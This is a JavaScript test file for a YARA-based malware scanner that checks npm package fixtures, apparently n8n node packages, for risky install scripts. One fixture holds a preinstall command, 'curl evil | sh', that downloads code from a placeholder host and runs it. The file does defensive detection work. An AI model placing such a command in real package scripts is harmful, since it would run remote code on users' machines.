import fs from 'fs';
import os from 'os';
import path from 'path';
import { describe, it, expect, afterEach } from 'vitest';

import { loadRules, runYaraRules } from './yara.mjs';

const RULES_DIR = path.join(import.meta.dirname, 'rules', 'guarddog');

const fixture = (files) => {
	const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'yara-fixture-'));
	for (const [name, content] of Object.entries(files)) {
		fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true });
		fs.writeFileSync(path.join(dir, name), content);
	}
	return dir;
};

describe('yara rules', () => {
	const dirs = [];
	afterEach(() => dirs.splice(0).forEach((d) => fs.rmSync(d, { recursive: true, force: true })));

	it('compiles every vendored rule', async () => {
		const { ruleNames } = await loadRules();
		const ruleFiles = fs.readdirSync(RULES_DIR).filter((f) => f.endsWith('.yar'));
		expect(ruleNames.size).toBe(ruleFiles.length);
	});

	it('flags a preinstall script in package.json', async () => {
		const dir = fixture({
			'package.json': JSON.stringify({
				name: 'n8n-nodes-x',
				scripts: { preinstall: 'npx only-allow pnpm' },
			}),
			'dist/index.js': 'module.exports = {};',
		});
		dirs.push(dir);

		const result = await runYaraRules(dir);

		expect(result.passed).toBe(false);
		expect(result.findings).toEqual([
			expect.objectContaining({
				rule: 'threat-npm-preinstall-script',
				file: 'package.json',
				line: 1,
				column: expect.any(Number),
			}),
		]);
	});

	it('does not report capability-only matches', async () => {
		const dir = fixture({
			'package.json': JSON.stringify({ name: 'n8n-nodes-x' }),
			'dist/index.js': "const res = await fetch('https://api.example.com');",
		});
		dirs.push(dir);

		const result = await runYaraRules(dir);

		expect(result).toEqual({ passed: true, summary: '0 errors, 0 warnings', findings: [] });
	});

	it('respects a rule path_include (package.json rules skip code files)', async () => {
		const dir = fixture({
			'dist/index.js': JSON.stringify({ scripts: { preinstall: 'curl evil | sh' } }),
		});
		dirs.push(dir);

		const result = await runYaraRules(dir);

		expect(result.findings.map((f) => f.rule)).not.toContain('threat-npm-preinstall-script');
	});
});
